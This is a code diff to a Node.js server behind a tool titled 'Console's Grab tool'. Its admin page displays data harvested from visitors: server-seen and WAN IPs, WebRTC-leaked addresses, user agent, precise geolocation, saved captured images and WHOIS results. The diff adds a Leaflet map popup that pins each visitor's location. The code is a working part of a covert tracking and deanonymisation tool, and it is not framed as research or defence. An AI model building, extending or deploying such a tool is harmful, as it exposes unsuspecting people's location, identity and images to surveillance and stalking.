@@ -130,14 +130,12 @@ const server = http.createServer((req, res) => {
           saved: false
         };
 
-        // Save image if provided
         if (data.image) {
           const imgName = `capture_${Date.now()}.png`;
           fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
           record.imageFile = imgName;
         }
 
-        // Public IPs for WHOIS
         const ips = [];
         if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
         record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });
@@ -162,7 +160,6 @@ const server = http.createServer((req, res) => {
               if (pending === 0) finalize();
             });
           });
-          // Fallback save after 5s
           setTimeout(finalize, 5000);
         }
 
@@ -203,7 +200,6 @@ const server = http.createServer((req, res) => {
       return res.end('Invalid credentials');
     }
 
-    // --- Render last 20 records ---
     let dataArr = [];
     if (fs.existsSync(DATA_FILE)) {
       try { dataArr = JSON.parse(fs.readFileSync(DATA_FILE,'utf8')); } 
@@ -211,46 +207,130 @@ const server = http.createServer((req, res) => {
     }
     dataArr = dataArr.slice(-20);
 
-    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title><style>'+
-      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;}' +
-      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:95%;max-width:700px;border-radius:5px;text-align:left;}' +
-      '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}' +
-      '.label{color:#7fff7f; font-weight:bold;}' +        
-      '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}' +
-      'a.geo{color:#00f;}' +
-      'img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}' +
+    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title>'+
+      '<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />'+
+      '<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>'+
+      '<style>.map{height:200px;width:100%;margin:10px 0;}'+
+      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;}'+
+      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:95%;max-width:700px;border-radius:5px;text-align:left;}'+
+      '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}'+
+      '.label{color:#7fff7f; font-weight:bold;}'+
+      '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}'+
+      'a.geo{color:#0ff;cursor:pointer;text-decoration:underline;} img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}'+
       '@media(max-width:600px){.record{width:95%;padding:10px;}}'+
-      `</style></head><body><h1 style="color:#0f0;">Console's Grab tool</h1>`;
+      '</style></head><body><h1 style="color:#0f0;">Console\'s Grab tool</h1>';
 
     dataArr.forEach((rec,i)=>{
       out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;
       out += `<span class="label" style="color:#ff0;">Server Connection IP:</span> <span style="color:#0f0;">${rec.serverObservedIP}</span><br>`;
       out += `<span class="label" style="color:#0ff;">Public WAN IP:</span> <span style="color:#0f0;">${rec.externalPublicIP || 'N/A'}</span><br>`;
       out += `<span class="label">User-Agent:</span> <pre class="prebox">${rec.userAgent}</pre>`;
+
       if (rec.geolocation) {
-        out += `<span class="label">Geolocation:</span> <a class="geo" target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> <span>(±${rec.geolocation.acc}m)</span><br>`;
+        const lat = rec.geolocation.lat;
+        const lon = rec.geolocation.lng;
+        const acc = rec.geolocation.acc || 50;
+        out += `<span class="label">Geolocation:</span> 
+                <a href="#" class="geo-link" data-lat="${lat}" data-lon="${lon}" data-acc="${acc}">${lat}, ${lon} (±${acc}m)</a><br>`;
       }
+
       if (rec.webrtcIPs?.length) {
         out += `<span class="label">WebRTC Discovered:</span> <pre class="prebox">`;
         rec.webrtcIPs.forEach(ip=>{ out += ipLabel(ip,"WebRTC") + "\n"; });
         out += `</pre>`;
       }
+
       if (rec.imageFile) out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.imageFile}"><br>`;
+
       if (rec.whois) {
         for (let [ip,w] of Object.entries(rec.whois)) {
           let preview = w.length>1000?w.slice(0,1000)+"\n[truncated]":w;
           out += `<h3 style="color:#0f0;">WHOIS for ${ip}</h3><pre class="prebox">${preview}</pre>`;
         }
       }
+
       out += `</div>`;
     });
 
+    // --- Fixed popup modal ---
+    out += `
+    <div id="mapModal" style="
+      display:none;
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(0,0,0,0.8);
+      z-index:1000;
+      justify-content:center;
+      align-items:center;
+    ">
+      <div id="mapContainer" style="
+        position:relative;
+        width:600px;
+        height:600px;
+        background:#fff;
+        border-radius:5px;
+      ">
+        <span id="closeMap" style="
+          position:absolute;
+          top:5px;
+          right:10px;
+          cursor:pointer;
+          font-size:25px;
+          font-weight:bold;
+          color:#000;
+          z-index:1001;
+        ">&times;</span>
+        <div id="popupMap" style="width:100%; height:100%; border-radius:5px;"></div>
+      </div>
+    </div>
+    <script>
+      let mapInstance = null;
+      const modal = document.getElementById('mapModal');
+      const closeBtn = document.getElementById('closeMap');
+
+      document.querySelectorAll('.geo-link').forEach(link => {
+        link.addEventListener('click', e => {
+          e.preventDefault();
+          const lat = parseFloat(link.dataset.lat);
+          const lon = parseFloat(link.dataset.lon);
+          const acc = parseFloat(link.dataset.acc);
+
+          modal.style.display = 'flex';
+
+          if (mapInstance) mapInstance.remove();
+
+          mapInstance = L.map('popupMap').setView([lat, lon], 15);
+          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap contributors'
+          }).addTo(mapInstance);
+
+          L.marker([lat, lon]).addTo(mapInstance);
+          const circle = L.circle([lat, lon], {
+            color: 'red',
+            fillColor: '#f03',
+            fillOpacity: 0.2,
+            radius: acc
+          }).addTo(mapInstance);
+
+          mapInstance.fitBounds(circle.getBounds());
+        });
+      });
+
+      closeBtn.addEventListener('click', () => modal.style.display = 'none');
+      modal.addEventListener('click', e => {
+        if (e.target === modal) modal.style.display = 'none';
+      });
+    </script>
+    `;
+
     out += '</body></html>';
-    res.writeHead(200, { 'Content-Type':'text/html; charset=utf-8' });
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
     return res.end(out);
   }
 
-  // --- 404 fallback ---
   res.writeHead(404);
   res.end('Not found');
 });
